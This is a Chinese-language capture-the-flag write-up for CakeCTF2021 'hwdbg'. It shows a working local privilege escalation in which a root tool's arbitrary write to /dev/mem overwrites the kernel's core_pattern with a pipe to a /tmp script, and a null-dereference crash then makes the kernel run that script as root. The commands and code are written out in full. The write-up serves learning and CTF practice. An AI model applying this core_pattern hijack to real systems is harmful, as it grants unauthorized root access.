# CakeCTF2021 hwdbg

## 题目简述

题目在 QEMU 中提供一个以 root 权限运行的 `hwdbg` 工具。其 `mw` 子命令打开 `/dev/mem`，按照用户给出的物理偏移把标准输入写入物理内存。虽然内核启用了 KASLR、SMEP、SMAP 和 PTI，这个原语已经绕过虚拟地址权限，能够直接篡改内核数据。

## 解题过程

### 确认物理任意写

`hwdbg.c` 的关键路径没有边界或目标检查：

```c
int fd = open("/dev/mem", O_RDWR | O_SYNC);
lseek(fd, offset, SEEK_SET);
read(0, buf, 0x1000);
write(fd, buf, size);
```

工具本身是提权边界，攻击者不必先取得内核代码执行。附件环境中可以结合给定内核、符号和内存布局确定 `core_pattern` 对应的物理位置；官方环境使用 `0x34ac2a0`。这个地址只适用于该 QEMU 镜像，换内核后必须重新定位。

### 把 core_pattern 改为管道处理器

Linux 的 `core_pattern` 若以 `|` 开头，崩溃进程的 core dump 会交给后面的用户态程序处理，处理器由内核以高权限启动。先在 `/tmp` 创建辅助脚本：

```sh
printf '%s\n' '#!/bin/sh' 'chmod 777 /flag.txt' > /tmp/nyanta
chmod +x /tmp/nyanta
```

再把 `|/tmp/nyanta\0` 写入对应物理地址：

```sh
printf '|/tmp/nyanta\0' | hwdbg mw d 0x34ac2a0
```

`hwdbg` 用十六进制解析长度参数，因此 `d` 表示 13 字节，正好覆盖管道标记、脚本路径和结尾 NUL。仓库官方脚本传入 `13`，会被解释为十六进制 `0x13`；由于路径后已经写入 NUL，额外覆盖的尾部字节不影响该附件环境，但精确长度写法更稳妥。

### 触发崩溃并读取 flag

官方解法上传一个极小的静态程序，让它解引用空指针：

```c
int _start(void) {
    return *(int *)0;
}
```

执行后内核进入 core dump 路径，以 root 身份运行 `/tmp/nyanta`，从而修改 flag 权限。最后可读出：

```text
CakeCTF{phys1c4l_4ddr3ss_1s_th3_m0st_h0n3st_4ddr3ss_083f63}
```

## 方法总结

- 可写 `/dev/mem` 等价于强大的物理内存修改能力，常规虚拟内存防护并不能约束它。
- `core_pattern` 的管道模式是内核题中常见的用户态提权落点：改写配置后只需制造一次崩溃。
- 物理偏移高度依赖给定镜像；可靠复现必须说明地址来源，不能把附件偏移泛化到其他系统。
